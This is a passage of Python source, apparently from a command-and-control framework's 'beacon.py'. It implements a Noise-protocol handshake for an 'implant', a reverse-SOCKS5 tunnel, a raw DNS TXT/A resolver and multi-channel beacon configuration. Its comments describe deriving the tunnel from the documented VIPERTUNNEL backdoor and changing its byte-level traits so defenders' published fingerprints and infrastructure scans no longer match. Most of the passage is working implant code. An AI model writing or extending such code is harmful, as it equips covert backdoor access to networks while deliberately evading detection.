        self._cipher = _CipherState(temp_key)

    # `psk` is the first token of the first message in psk0, so a cipher
    # state always exists before either of these is reached. Noise's
    # "return the plaintext unchanged when there is no key" case cannot
    # arise in this pattern and is deliberately not implemented: a
    # cleartext payload must never be a reachable outcome here.

    def encrypt_and_hash(self, plaintext: bytes) -> bytes:
        ciphertext = self._cipher.encrypt_with_ad(self._h, plaintext)
        self.mix_hash(ciphertext)
        return ciphertext

    def decrypt_and_hash(self, ciphertext: bytes) -> bytes:
        plaintext = self._cipher.decrypt_with_ad(self._h, ciphertext)
        self.mix_hash(ciphertext)
        return plaintext

    def split(self) -> Tuple[_CipherState, _CipherState]:
        first, second = _hkdf(self._ck, b"", 2)
        return _CipherState(first), _CipherState(second)


class NoiseSession:
    """One side of one `Noise_NKpsk0_25519_AESGCM_SHA256` connection.

    Built through `initiator()` or `responder()`, then driven in order:

        initiator                         responder
        ---------                         ---------
        message_one = initiate(payload)
                              -------->   payload = respond(message_one)
        complete(message_two) <--------    message_two = reply()
        encrypt() / decrypt()              encrypt() / decrypt()

    `respond` hands back the first message's payload because that payload
    is how the responder learns what kind of connection this is; it is
    authenticated before it is returned, so a caller may dispatch on it.
    `reply` exists because something has to produce message 2, and the
    responder cannot produce it until it has read message 1.

    `encrypt` returns the bare Noise message. The `>H` length prefix is
    the framing layer's, not this one's.

    A call in the wrong order raises RuntimeError; a peer that fails to
    authenticate, or a message that is malformed or tampered with, raises
    ValueError. The two are kept distinct on purpose: the tunnel server
    catches ValueError to mean "this peer is not ours, say nothing and
    close", and must not swallow its own sequencing bugs with it.
    """

    PROTOCOL_NAME = b"Noise_NKpsk0_25519_AESGCM_SHA256"
    # Noise's own cap, and the one the `>H` length prefix above this can
    # express. The tag is inside it, so the plaintext ceiling is 65519.
    MAX_MESSAGE_LEN = 65535
    MAX_PAYLOAD_LEN = MAX_MESSAGE_LEN - GCM_TAG_LEN

    def __init__(self, is_initiator: bool,
                 static_public: Optional[bytes] = None,
                 static_private: Optional[bytes] = None,
                 psk: Optional[bytes] = None,
                 psk_lookup: Optional[Callable[[], Iterable[bytes]]] = None,
                 prologue: bytes = b""):
        self._is_initiator = bool(is_initiator)
        self._prologue = prologue
        self._psk_lookup = psk_lookup
        self._stage = _NOISE_START
        self._e_private = None
        self._e_public = None
        self._re = None
        self._send = None
        self._recv = None
        # The PSK that authenticates this connection. Known from the start
        # on the initiator, and only after `respond` on the responder,
        # which has to find out which of several it is -- the caller reads
        # it back to map the connection to the build it belongs to.
        self.psk = None
        # Noise's GetHandshakeHash, available once the handshake is done.
        self.handshake_hash = None
        if self._is_initiator:
            self._static_private = None
            self._static_public = _noise_32_bytes(
                static_public, "Noise responder static public key")
            self.psk = _noise_32_bytes(psk, "Noise pre-shared key")
        else:
            self._static_private = _noise_32_bytes(
                static_private, "Noise responder static private key")
            # NK's pre-message is the responder's static public key, which
            # the responder therefore has to derive from its own private
            # one rather than being handed both.
            self._static_public = _x25519(self._static_private,
                                          _X25519_BASEPOINT)
        self._sym = self._initial_symmetric()

    @classmethod
    def initiator(cls, server_public: bytes, psk: bytes,
                  prologue: bytes = b"") -> "NoiseSession":
        """The implant's side: the server's static public key and one PSK,
        both baked into the build.

        `prologue` is empty in this deployment. It is a parameter because
        the published Noise test vectors specify a non-empty one, and
        replaying those vectors is the only check on this implementation
        that does not come from this implementation.
        """
        return cls(True, static_public=server_public, psk=psk,
                   prologue=prologue)

    @classmethod
    def responder(cls, static_private: bytes,
                  psk_lookup: Callable[[], Iterable[bytes]],
                  prologue: bytes = b"") -> "NoiseSession":
        """The server's side: its static private key, and a callable that
        returns the PSKs it is willing to accept.

        A lookup rather than one key because a deployment holds one PSK
        per build and cannot know which build a connection belongs to
        until the connection authenticates. It is called once per
        handshake, and the list it returns is the whole bound on the work
        an unauthenticated peer can cause.
        """
        return cls(False, static_private=static_private,
                   psk_lookup=psk_lookup, prologue=prologue)

    # ── The handshake ──

    def initiate(self, payload: bytes = b"") -> bytes:
        """Message 1, `psk, e, es`, carrying `payload`."""
        self._require(True, _NOISE_START, "initiate")
        self._check_payload_fits(payload, _NOISE_KEY_LEN)
        sym = self._sym
        sym.mix_key_and_hash(self.psk)
        public = self._ephemeral_public()
        sym.mix_hash(public)
        # Noise §9: in a PSK handshake the ephemeral is mixed into the
        # chaining key as well as the hash. That is what makes two first
        # messages with the same PSK and the same payload differ in every
        # byte rather than only in the ephemeral.
        sym.mix_key(public)
        sym.mix_key(_x25519(self._e_private, self._static_public))
        message = public + sym.encrypt_and_hash(payload)
        self._stage = _NOISE_SENT_MESSAGE_ONE
        return message

    def respond(self, message: bytes) -> bytes:
        """Read message 1 and return its payload, authenticated.

        Each PSK the lookup offers is tried until one authenticates the
        message. Every failure is a GCM tag failure and nothing else: the
        work per candidate is two HKDFs and one tag check, and the one
        Diffie-Hellman the message needs does not depend on the PSK, so it
        is done once. A candidate that is not 32 bytes raises rather than
        being skipped -- a malformed key in the store is a configuration
        fault, and silently excluding it would turn it into a build that
        mysteriously cannot connect.
        """
        self._require(False, _NOISE_START, "respond")
        self._check_message_length(message, "message 1")
        remote_ephemeral = bytes(message[:_NOISE_KEY_LEN])
        ciphertext = bytes(message[_NOISE_KEY_LEN:])
        # From here the session is spent whatever happens: a peer gets one
        # attempt, and a failure leaves nothing a caller could retry on.
        self._stage = _NOISE_FAILED
        candidates = [_noise_32_bytes(psk, "Noise pre-shared key")
                      for psk in self._psk_lookup()]
        if not candidates:
            raise ValueError(
                "no pre-shared keys to try: a responder with no registered "
                "build cannot authenticate anybody")
        shared = _x25519(self._static_private, remote_ephemeral)
        for psk in candidates:
            sym = self._initial_symmetric()
            sym.mix_key_and_hash(psk)
            sym.mix_hash(remote_ephemeral)
            sym.mix_key(remote_ephemeral)
            sym.mix_key(shared)
            try:
                payload = sym.decrypt_and_hash(ciphertext)
            except ValueError:
                continue
            self._sym = sym
            self._re = remote_ephemeral
            self.psk = psk
            self._stage = _NOISE_READ_MESSAGE_ONE
            return payload
        raise ValueError(
            "Noise message 1 did not authenticate under any of the %d "
            "pre-shared keys offered" % len(candidates))

    def reply(self, payload: bytes = b"") -> bytes:
        """Message 2, `e, ee`, carrying `payload`. Completes this side."""
        self._require(False, _NOISE_READ_MESSAGE_ONE, "reply")
        self._check_payload_fits(payload, _NOISE_KEY_LEN)
        sym = self._sym
        public = self._ephemeral_public()
        sym.mix_hash(public)
        sym.mix_key(public)
        sym.mix_key(_x25519(self._e_private, self._re))
        message = public + sym.encrypt_and_hash(payload)
        self._split()
        return message

    def complete(self, message: bytes) -> None:
        """Read message 2 and move to transport.

        The pattern allows message 2 a payload, which this API has no use
        for: it is authenticated, mixed into the handshake hash, and
        dropped. Nothing downstream may read an unauthenticated byte, so
        there is no path that returns it un-checked.
        """
        self._require(True, _NOISE_SENT_MESSAGE_ONE, "complete")
        self._check_message_length(message, "message 2")
        remote_ephemeral = bytes(message[:_NOISE_KEY_LEN])
        self._stage = _NOISE_FAILED
        sym = self._sym
        sym.mix_hash(remote_ephemeral)
        sym.mix_key(remote_ephemeral)
        sym.mix_key(_x25519(self._e_private, remote_ephemeral))
        sym.decrypt_and_hash(bytes(message[_NOISE_KEY_LEN:]))
        self._split()

    # ── Transport ──

    def encrypt(self, plaintext: bytes) -> bytes:
        """One transport message, unframed."""
        self._require(None, _NOISE_TRANSPORT, "encrypt")
        self._check_payload_fits(plaintext, 0)
        return self._send.encrypt_with_ad(b"", plaintext)

    def decrypt(self, ciphertext: bytes) -> bytes:
        """The plaintext of one transport message, or a ValueError.

        A frame that is tampered with, truncated, replayed or arrives out
        of order all fail here, because the counter is the only sequence
        number the protocol has.
        """
        self._require(None, _NOISE_TRANSPORT, "decrypt")
        if len(ciphertext) > self.MAX_MESSAGE_LEN:
            raise ValueError(
                "transport message is %d bytes; a Noise message is at most "
                "%d" % (len(ciphertext), self.MAX_MESSAGE_LEN))
        return self._recv.decrypt_with_ad(b"", ciphertext)

    # ── Internals ──

    def _initial_symmetric(self) -> _SymmetricState:
        """A SymmetricState with the prologue and the pre-message mixed in.

        Rebuilt rather than copied for each PSK the responder tries: it is
        two SHA-256 calls, where a copy would have to be deep to be safe.
        """
        sym = _SymmetricState(self.PROTOCOL_NAME)
        sym.mix_hash(self._prologue)
        # NK's pre-message, `<- s`. Both ends mix it before the first
        # message, so an initiator aimed at the wrong server fails on the
        # first tag rather than somewhere later and less legibly.
        sym.mix_hash(self._static_public)
        return sym

    def _ephemeral_public(self) -> bytes:
        if self._e_private is None:
            self._e_private, self._e_public = _x25519_keypair()
        return self._e_public

    def _fix_ephemeral(self, private: bytes) -> None:
        """Pin the ephemeral keypair instead of generating one.

        A test seam, and the only way to replay a published test vector,
        which specifies both ephemerals. Production must never call it: an
        ephemeral reused across two handshakes reuses the transport keys
        with it.
        """
        if self._stage != _NOISE_START:
            raise RuntimeError("the ephemeral key is already in use")
        self._e_private = _noise_32_bytes(private,
                                          "Noise ephemeral private key")
        self._e_public = _x25519(self._e_private, _X25519_BASEPOINT)

    def _split(self) -> None:
        first, second = self._sym.split()
        # Noise §5.3: the initiator sends under the first key and receives
        # under the second; the responder has them the other way round.
        if self._is_initiator:
            self._send, self._recv = first, second
        else:
            self._send, self._recv = second, first
        self.handshake_hash = self._sym.handshake_hash()
        self._stage = _NOISE_TRANSPORT

    def _role(self) -> str:
        return "initiator" if self._is_initiator else "responder"

    def _require(self, is_initiator, stage: str, call: str) -> None:
        """Refuse a call this session is not at. `is_initiator` None means
        either role may make it.
        """
        if is_initiator is not None and bool(is_initiator) != self._is_initiator:
            raise RuntimeError(
                "%s() is the %s's call and this session is the %s"
                % (call, "initiator" if is_initiator else "responder",
                   self._role()))
        if self._stage != stage:
            raise RuntimeError(
                "%s() cannot run now: this %s session is at %r, not %r"
                % (call, self._role(), self._stage, stage))

    def _check_payload_fits(self, payload: bytes, overhead: int) -> None:
        limit = self.MAX_PAYLOAD_LEN - overhead
        if len(payload) > limit:
            raise ValueError(
                "payload is %d bytes; at most %d fits here, because the "
                "message and its %d-byte tag together must not exceed %d"
                % (len(payload), limit, GCM_TAG_LEN, self.MAX_MESSAGE_LEN))

    def _check_message_length(self, message: bytes, what: str) -> None:
        shortest = _NOISE_KEY_LEN + GCM_TAG_LEN
        if len(message) < shortest:
            raise ValueError(
                "Noise %s is %d bytes; the shortest valid one is %d, being "
                "a %d-byte ephemeral key, an empty payload and a %d-byte "
                "tag" % (what, len(message), shortest, _NOISE_KEY_LEN,
                         GCM_TAG_LEN))
        if len(message) > self.MAX_MESSAGE_LEN:
            raise ValueError(
                "Noise %s is %d bytes; a Noise message is at most %d"
                % (what, len(message), self.MAX_MESSAGE_LEN))


# ── Tunnel wire format: framing, command messages and SOCKS5 ──

# This layer is derived from VIPERTUNNEL, the Python reverse-SOCKS backdoor
# InfoGuard Labs documented in "Slithering Through the Noise" (2026-04-09).
# It keeps that protocol's shape and replaces its bytes, and the
# replacements will read as bugs to anybody who knows the original:
#
#   | Field          | The original            | Here                      |
#   |----------------|-------------------------|---------------------------|
#   | SOCKS version  | stripped from both ends | restored, 0x05, checked   |
#   | RSV            | absent                  | present, 0x00, checked    |
#   | Ports          | little-endian           | big-endian, RFC 1928 §4   |
#   | Success        | 1, with 0 for failure   | 0, per RFC 1928 §6        |
#   | ATYP=4, IPv6   | refused                 | supported                 |
#   | Keep-alive     | a zero uint16, `00 00`  | MSG_PING / MSG_PONG       |
#
# The frame length prefix is big-endian for the same reason the ports are,
# and not because anything here needs it that way: the original's
# little-endian numbers are a published, scannable trait, and a fingerprint
# we do not need is one we do not keep. `00 00` on connect is how its
# infrastructure was enumerated across hosting providers, so an empty frame
# -- which is those two bytes exactly -- is refused at both ends here
# rather than merely going unused.
#
# The wire, outermost first:
#
#   frame           = ">H" length + one Noise message
#   command message = kind(1) + compact JSON object        (inside Noise)
#   SOCKS request   = ver(1)=5 cmd(1) rsv(1)=0 atyp(1) addr port(">H")
#   SOCKS reply     = ver(1)=5 rep(1) rsv(1)=0 atyp(1) addr port(">H")
#
# What is deliberately absent is the SOCKS greeting and the RFC 1929
# username/password sub-negotiation. Only the operator-facing side performs
# those, and that side is never delivered to a target, so neither belongs in
# this file.
#
# This section lives in `beacon.py` because `api_beacon_gen` reads exactly
# this one file to build the artifact the tunnel endpoint runs from. A
# helper in another module would pass every test here and be absent on
# target. `software/c2/tunnel/protocol.py` re-exports these names for the
# server side; it holds no second copy.

# The frame length prefix and the SOCKS port, which are the two places the
# original used little-endian and so the two a reader will check. One
# struct for both, because they are one decision.
_BE_UINT16 = struct.Struct(">H")

FRAME_PREFIX_LEN = _BE_UINT16.size

# A frame carries one Noise message, so its ceiling is Noise's own -- and
# that is exactly what a `>H` prefix can express, so a frame that fits the
# prefix always fits the cipher and there is no third limit to keep in step.
MAX_FRAME_LEN = NoiseSession.MAX_MESSAGE_LEN

# The plaintext ceiling, a frame's worth less the GCM tag. Aliased from the
# session rather than written as a number again: two names for 65519 is one
# too many, and the second would be the one that goes stale.
MAX_PAYLOAD_LEN = NoiseSession.MAX_PAYLOAD_LEN


def write_frame(sock: socket.socket, payload: bytes) -> None:
    """Write one length-prefixed frame, or refuse before touching `sock`.

    Both refusals happen before any byte goes out, because a prefix on the
    wire with nothing behind it leaves the peer unable to read the stream
    ever again and there is no way to take it back. The prefix and the body
    go in one `sendall` for the same reason -- two calls can interleave
    with another thread's frame on the same socket.
    """
    if not payload:
        raise ValueError(
            "an empty frame is the two bytes 00 00 on the wire, which is "
            "the inherited keep-alive this protocol exists not to send")
    if len(payload) > MAX_FRAME_LEN:
        raise ValueError(
            "frame payload is %d bytes; a `>H` prefix tops out at %d"
            % (len(payload), MAX_FRAME_LEN))
    sock.sendall(_BE_UINT16.pack(len(payload)) + payload)


def read_frame(sock: socket.socket) -> bytes:
    """One whole frame's payload, or a ValueError.

    A peer that closes mid-frame raises, and so does one that stalls past
    the socket's own timeout -- the caller sets that, because how long to
    wait is the caller's policy and not this function's. What never
    happens is a short read returned as though it were a whole frame.
    """
    prefix = _read_exactly(sock, FRAME_PREFIX_LEN, "frame length prefix")
    (length,) = _BE_UINT16.unpack(prefix)
    if length == 0:
        raise ValueError(
            "a frame of length 0 is the inherited `00 00` keep-alive; this "
            "protocol does not send it and does not accept it")
    return _read_exactly(sock, length, "frame body")


def _read_exactly(sock: socket.socket, count: int, what: str) -> bytes:
    """Exactly `count` bytes, or a ValueError naming how far it got."""
    chunks = []
    have = 0
    while have < count:
        chunk = sock.recv(count - have)
        if not chunk:
            raise ValueError(
                "the peer closed after %d of %d bytes of the %s"
                % (have, count, what))
        chunks.append(chunk)
        have += len(chunk)
    return b"".join(chunks)


# ── Command messages ──

MSG_HELLO = 1
MSG_RELAY = 2
MSG_OPEN_RELAY = 3
MSG_PING = 4
MSG_PONG = 5
MSG_CLOSE = 6

MESSAGE_KIND_NAMES = {
    MSG_HELLO: "HELLO",
    MSG_RELAY: "RELAY",
    MSG_OPEN_RELAY: "OPEN_RELAY",
    MSG_PING: "PING",
    MSG_PONG: "PONG",
    MSG_CLOSE: "CLOSE",
}

MESSAGE_KINDS = tuple(sorted(MESSAGE_KIND_NAMES))


def _code_list(table: dict) -> str:
    """`1 (HELLO), 2 (RELAY)` -- what an error says it expected instead.

    Built from the table rather than written out, so a renumbering cannot
    leave an error message describing the protocol as it used to be.
    """
    return ", ".join("%d (%s)" % (code, table[code])
                     for code in sorted(table))


def encode_message(kind: int, body: dict) -> bytes:
    """One command message: a kind byte and a compact JSON object.

    JSON rather than a packed struct because this channel carries a handful
    of messages an hour, so being able to read a capture of our own test
    rig is worth more than the bytes. Keys are sorted, so the same body
    always encodes to the same bytes and two captures diff cleanly.
    """
    if kind not in MESSAGE_KIND_NAMES:
        raise ValueError("message kind %r is not one of %s"
                         % (kind, _code_list(MESSAGE_KIND_NAMES)))
    if not isinstance(body, dict):
        raise ValueError("a message body is a JSON object, not %s"
                         % type(body).__name__)
    try:
        text = json.dumps(body, separators=(",", ":"), sort_keys=True)
    except (TypeError, ValueError):
        text = None
    # Raised outside the except block, and without the body in it: a body
    # holds a session token and a hostname, and neither belongs in a log.
    if text is None:
        raise ValueError("a %s body must be JSON-serialisable with string "
                         "keys" % MESSAGE_KIND_NAMES[kind])
    raw = bytes([kind]) + text.encode("utf-8")
    if len(raw) > MAX_PAYLOAD_LEN:
        raise ValueError(
            "a %s message encodes to %d bytes; at most %d fits in one "
            "Noise message" % (MESSAGE_KIND_NAMES[kind], len(raw),
                               MAX_PAYLOAD_LEN))
    return raw


def decode_message(raw: bytes) -> Tuple[int, dict]:
    """The kind and body of one command message, or a ValueError."""
    data = bytes(raw)
    if not data:
        raise ValueError("a command message is at least a kind byte")
    kind = data[0]
    if kind not in MESSAGE_KIND_NAMES:
        raise ValueError("message kind %d is not one of %s"
                         % (kind, _code_list(MESSAGE_KIND_NAMES)))
    try:
        # json.JSONDecodeError and UnicodeDecodeError are both ValueErrors.
        body = json.loads(data[1:].decode("utf-8"))
    except ValueError:
        body = None
    if not isinstance(body, dict):
        raise ValueError("the body of a %s message is not a JSON object"
                         % MESSAGE_KIND_NAMES[kind])
    return kind, body


# ── SOCKS5 requests and replies, RFC 1928 §4 and §6 ──

SOCKS_VERSION = 5

# RFC 1928 reserves byte 3 of both messages and fixes it at zero. The
# original dropped it; a non-zero one here is a malformed message.
_SOCKS_RESERVED = 0

# ver | cmd-or-rep | rsv | atyp, before the address.
_SOCKS_HEADER_LEN = 4

CMD_CONNECT = 1
CMD_BIND = 2
CMD_UDP_ASSOCIATE = 3

SOCKS_COMMAND_NAMES = {
    CMD_CONNECT: "CONNECT",
    CMD_BIND: "BIND",
    CMD_UDP_ASSOCIATE: "UDP ASSOCIATE",
}

# Only CONNECT is answered. The other two still decode, because a peer that
# asks for one has to be refused with REPLY_COMMAND_NOT_SUPPORTED, and a
# refusal cannot be sent for a request that never parsed -- a parse error
# is indistinguishable, from the far end, from a tunnel that has died.
SUPPORTED_COMMANDS = (CMD_CONNECT,)

ATYP_IPV4 = 1
ATYP_DOMAIN = 3
ATYP_IPV6 = 4

SOCKS_ADDRESS_TYPE_NAMES = {
    ATYP_IPV4: "IPv4",
    ATYP_DOMAIN: "domain name",
    ATYP_IPV6: "IPv6",
}

REPLY_SUCCEEDED = 0
REPLY_GENERAL_FAILURE = 1
REPLY_NOT_ALLOWED = 2
REPLY_NETWORK_UNREACHABLE = 3
REPLY_HOST_UNREACHABLE = 4
REPLY_CONNECTION_REFUSED = 5
REPLY_TTL_EXPIRED = 6
REPLY_COMMAND_NOT_SUPPORTED = 7
REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 8

SOCKS_REPLY_NAMES = {
    REPLY_SUCCEEDED: "succeeded",
    REPLY_GENERAL_FAILURE: "general SOCKS server failure",
    REPLY_NOT_ALLOWED: "connection not allowed by ruleset",
    REPLY_NETWORK_UNREACHABLE: "network unreachable",
    REPLY_HOST_UNREACHABLE: "host unreachable",
    REPLY_CONNECTION_REFUSED: "connection refused",
    REPLY_TTL_EXPIRED: "TTL expired",
    REPLY_COMMAND_NOT_SUPPORTED: "command not supported",
    REPLY_ADDRESS_TYPE_NOT_SUPPORTED: "address type not supported",
}


def socks_command_supported(cmd: int) -> bool:
    """Whether this end answers `cmd` rather than refusing it.

    Separate from `decode_socks_request` on purpose, so that a BIND or UDP
    ASSOCIATE request decodes and the caller can answer it with
    REPLY_COMMAND_NOT_SUPPORTED.
    """
    return cmd in SUPPORTED_COMMANDS


def encode_socks_request(cmd: int, atyp: int, address: str,
                         port: int) -> bytes:
    """One SOCKS5 request, RFC 1928 §4.

    `atyp` is passed rather than inferred from `address`: the operator-side
    proxy relays what its client asked for, and a client that sends ATYP=3
    with something that happens to look like an IP literal must still be
    relayed as a name.
    """
    if cmd not in SOCKS_COMMAND_NAMES:
        raise ValueError("SOCKS command %r is not one of %s"
                         % (cmd, _code_list(SOCKS_COMMAND_NAMES)))
    return _encode_socks_envelope(cmd, atyp, address, port)


def decode_socks_request(raw: bytes) -> Tuple[int, int, str, int]:
    """`(cmd, atyp, address, port)` from one whole SOCKS5 request.

    `raw` must be exactly one request and nothing else: on this protocol a
    request arrives as its own frame, so trailing bytes are a malformed
    message rather than the beginning of the relayed stream. A reader
    pulling requests out of a raw TCP stream has to delimit them itself.
    """
    cmd, atyp, address, port = _decode_socks_envelope(raw, "request")
    if cmd not in SOCKS_COMMAND_NAMES:
        raise ValueError("SOCKS command %d is not one of %s"
                         % (cmd, _code_list(SOCKS_COMMAND_NAMES)))
    return cmd, atyp, address, port


def encode_socks_reply(reply: int, atyp: int = ATYP_IPV4,
                       address: str = "0.0.0.0", port: int = 0) -> bytes:
    """One SOCKS5 reply, RFC 1928 §6, where `REPLY_SUCCEEDED` is 0.

    The bound address defaults to `0.0.0.0:0` because RFC 1928 leaves
    BND.ADDR and BND.PORT meaningless when the reply is not a success, and
    every refusal path would otherwise have to invent one.
    """
    if reply not in SOCKS_REPLY_NAMES:
        raise ValueError("SOCKS reply code %r is not one of %s"
                         % (reply, _code_list(SOCKS_REPLY_NAMES)))
    return _encode_socks_envelope(reply, atyp, address, port)


def decode_socks_reply(raw: bytes) -> Tuple[int, int, str, int]:
    """`(reply, atyp, address, port)` from one whole SOCKS5 reply."""
    reply, atyp, address, port = _decode_socks_envelope(raw, "reply")
    if reply not in SOCKS_REPLY_NAMES:
        raise ValueError("SOCKS reply code %d is not one of %s"
                         % (reply, _code_list(SOCKS_REPLY_NAMES)))
    return reply, atyp, address, port


def _encode_socks_envelope(code: int, atyp: int, address: str,
                           port: int) -> bytes:
    """`ver | code | rsv | atyp | addr | port`, where `code` is the CMD of
    a request or the REP of a reply.

    Shared because those two messages differ in nothing else, and a layout
    written down twice is a layout that gets corrected once.
    """
    if not isinstance(address, str):
        raise ValueError("a SOCKS address is text, not %s"
                         % type(address).__name__)
    if not isinstance(port, int) or not 0 <= port <= 0xFFFF:
        raise ValueError("port %r is not a uint16" % (port,))
    return (bytes([SOCKS_VERSION, code, _SOCKS_RESERVED, atyp])
            + _encode_socks_address(atyp, address)
            + _BE_UINT16.pack(port))


def _decode_socks_envelope(raw: bytes,
                           what: str) -> Tuple[int, int, str, int]:
    data = bytes(raw)
    if len(data) < _SOCKS_HEADER_LEN:
        raise ValueError(
            "a SOCKS %s opens with %d bytes of header; this one is %d "
            "bytes long in total" % (what, _SOCKS_HEADER_LEN, len(data)))
    if data[0] != SOCKS_VERSION:
        raise ValueError(
            "a SOCKS %s opens with version %d; this one says %d"
            % (what, SOCKS_VERSION, data[0]))
    if data[2] != _SOCKS_RESERVED:
        raise ValueError(
            "RFC 1928 reserves byte 3 of a %s and fixes it at 0x%02x; this "
            "one is 0x%02x" % (what, _SOCKS_RESERVED, data[2]))
    atyp = data[3]
    address, used = _decode_socks_address(data[_SOCKS_HEADER_LEN:], atyp,
                                          what)
    expected = _SOCKS_HEADER_LEN + used + _BE_UINT16.size
    if len(data) != expected:
        raise ValueError(
            "a SOCKS %s with this address is %d bytes; this one is %d"
            % (what, expected, len(data)))
    (port,) = _BE_UINT16.unpack(data[expected - _BE_UINT16.size:])
    # Byte 1 is the CMD of a request and the REP of a reply; which one it
    # is, and whether this end knows that value, is the caller's to say.
    return data[1], atyp, address, port


def _encode_socks_address(atyp: int, address: str) -> bytes:
    if atyp == ATYP_IPV4:
        return _pack_socks_ip(socket.AF_INET, address, "an IPv4 address")
    if atyp == ATYP_IPV6:
        return _pack_socks_ip(socket.AF_INET6, address, "an IPv6 address")
    if atyp == ATYP_DOMAIN:
        name = address.encode("utf-8")
        if not name:
            raise ValueError("a SOCKS domain name cannot be empty")
        if len(name) > 0xFF:
            raise ValueError(
                "a SOCKS domain name is %d bytes and its length byte tops "
                "out at %d" % (len(name), 0xFF))
        return bytes([len(name)]) + name
    raise ValueError("SOCKS address type %r is not one of %s"
                     % (atyp, _code_list(SOCKS_ADDRESS_TYPE_NAMES)))


def _pack_socks_ip(family: int, address: str, what: str) -> bytes:
    try:
        packed = socket.inet_pton(family, address)
    except (OSError, ValueError):
        packed = None
    if packed is None:
        raise ValueError("%r is not %s" % (address, what))
    return packed


def _decode_socks_address(tail: bytes, atyp: int,
                          what: str) -> Tuple[str, int]:
    """The address in `tail`, and how many of its bytes it took."""
    if atyp == ATYP_IPV4:
        return _unpack_socks_ip(socket.AF_INET, tail, 4, what), 4
    if atyp == ATYP_IPV6:
        return _unpack_socks_ip(socket.AF_INET6, tail, 16, what), 16
    if atyp == ATYP_DOMAIN:
        if not tail:
            raise ValueError("a SOCKS %s with ATYP=3 carries no length byte"
                             % what)
        length = tail[0]
        if length == 0:
            raise ValueError("a SOCKS %s carries an empty domain name"
                             % what)
        if len(tail) < 1 + length:
            raise ValueError(
                "a SOCKS %s promises a %d-byte domain name and carries %d "
                "bytes of it" % (what, length, len(tail) - 1))
        try:
            name = tail[1:1 + length].decode("utf-8")
        except ValueError:
            name = None
        # Refused rather than mangled with a replacement character: a name
        # we cannot read is a name we must not silently resolve.
        if name is None:
            raise ValueError("the domain name in a SOCKS %s is not UTF-8"
                             % what)
        return name, 1 + length
    raise ValueError("SOCKS address type %d is not one of %s"
                     % (atyp, _code_list(SOCKS_ADDRESS_TYPE_NAMES)))


def _unpack_socks_ip(family: int, tail: bytes, size: int,
                     what: str) -> str:
    if len(tail) < size:
        raise ValueError(
            "a SOCKS %s needs %d address bytes and carries %d"
            % (what, size, len(tail)))
    return socket.inet_ntop(family, tail[:size])


# ── Stdlib DNS resolver (TXT + A records) ──

# The resolver port. Named rather than written into the sendto call so a
# test can point this at a listener on a free port: binding 53 needs root,
# and in production dockerd or systemd owns it and forwards to an
# unprivileged listener, so nothing here ever binds it either.
_DNS_PORT = 53


def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
    """Minimal DNS query using raw UDP sockets. Returns list of strings (TXT) or IPs (A)."""
    qtypes = {"A": 1, "TXT": 16}
    qtype_num = qtypes.get(qtype.upper(), 1)

    txn_id = random.randint(0, 0xFFFF)
    flags = 0x0100  # standard query, recursion desired
    header = struct.pack("!HHHHHH", txn_id, flags, 1, 0, 0, 0)

    qname = b""
    for label in name.encode().split(b"."):
        qname += struct.pack("B", len(label)) + label
    qname += b"\x00"
    question = qname + struct.pack("!HH", qtype_num, 1)  # QCLASS=IN

    packet = header + question

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(packet, (server, _DNS_PORT))
        data, _ = sock.recvfrom(4096)
    finally:
        sock.close()

    if len(data) < 12:
        return []

    _, resp_flags, qdcount, ancount = struct.unpack("!HHHH", data[:8])
    rcode = resp_flags & 0x0F
    if rcode != 0:
        return []

    offset = 12
    for _ in range(qdcount):
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if (length & 0xC0) == 0xC0:
                offset += 2
                break
            offset += 1 + length
        offset += 4  # QTYPE + QCLASS

    results = []
    for _ in range(ancount):
        if offset >= len(data):
            break
        if (data[offset] & 0xC0) == 0xC0:
            offset += 2
        else:
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    offset += 1
                    break
                offset += 1 + length

        if offset + 10 > len(data):
            break
        rtype, rclass, ttl, rdlength = struct.unpack("!HHIH", data[offset:offset + 10])
        offset += 10
        rdata = data[offset:offset + rdlength]
        offset += rdlength

        if rtype == 1 and len(rdata) == 4:  # A record
            results.append(f"{rdata[0]}.{rdata[1]}.{rdata[2]}.{rdata[3]}")
        elif rtype == 16:  # TXT record
            txt_offset = 0
            txt_parts = []
            while txt_offset < len(rdata):
                txt_len = rdata[txt_offset]
                txt_offset += 1
                txt_parts.append(rdata[txt_offset:txt_offset + txt_len])
                txt_offset += txt_len
            results.append(b"".join(txt_parts).decode("utf-8", errors="replace"))

    return results


# The four channels a beacon can use, and the one place the config file is
# mapped onto them. `main.py` and `beacon_standalone.py` each used to build
# this dictionary by hand, and each listed https and dns only -- so `smb`
# and `quic` in a config file never reached the beacon, and the only way
# to switch either on was to construct a Beacon in Python. Two copies of
# one mapping, both missing the same half, is how that survived.
_FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic")


def tunnel_config_from_yaml(c2_cfg: dict, env=None) -> Optional[dict]:
    """Build the endpoint's `tunnel` block from `c2.tunnel`, or None.

    The sibling of `beacon_config_from_fallback` for the other thing a
    drop-box can run, and the reason goal 3 of this work is reachable: on
    a host where systemd starts the endpoint there is no beacon above it
    and no generated config block, so the file has to be able to say the
    same eight things the generator bakes in.

    `c2.tunnel` is **this host as a tunnel client** -- the endpoint dials
    out. `c2.tunnel_server` is the other side, the socket endpoints dial
    in to, and nothing here reads it. The two look alike and mean opposite
    things, exactly as `c2.fallback` and `c2.listeners` do; see
    `listeners/registry.py`.

    No `c2.tunnel` block at all yields None and is not an error: every
    deployment that predates this feature has none, and all of them have
    to keep starting.

    **The PSK is not read from the file.** Under `Noise_NKpsk0` the
    endpoint presents no static key of its own, so the PSK plus the
    server's public key is the entire credential, and this repository
    already settled where such a thing lives when it kept
    `RACCOON_LISTENER_TOKEN` out of the same file: a shared secret does
    not belong in something somebody will paste into a ticket. It comes
    from `RACCOON_TUNNEL_PSK`, which
    `services/raccoon-tunnel.service` supplies through an
    `EnvironmentFile`. A `psk` key found in the file is **refused by
    name**, whether the tunnel is enabled or not: ignoring it silently
    would leave the secret sitting in git with nobody told, and a
    refusal that waited for somebody to switch the tunnel on would have
    chosen the worst possible moment to appear.

    `env` is a seam for the tests. The deployed path is `os.environ`.

    Every problem is a `ValueError` naming the field, including the ones
    `tunnel_config_problem` finds: this is where the config is loaded, so
    this is where that predicate is asked. The caller decides what a
    refusal costs -- `tunnel_standalone` exits, and
